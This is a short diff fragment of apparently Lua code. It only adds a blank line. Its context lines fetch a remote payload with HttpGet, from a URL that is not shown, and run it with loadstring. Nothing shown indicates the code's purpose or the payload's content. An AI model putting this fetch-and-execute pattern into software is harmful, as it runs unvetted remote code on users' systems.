@@ -71,3 +71,4 @@ local payload = HttpGet(
 )
 
 assert(loadstring(payload))()
+
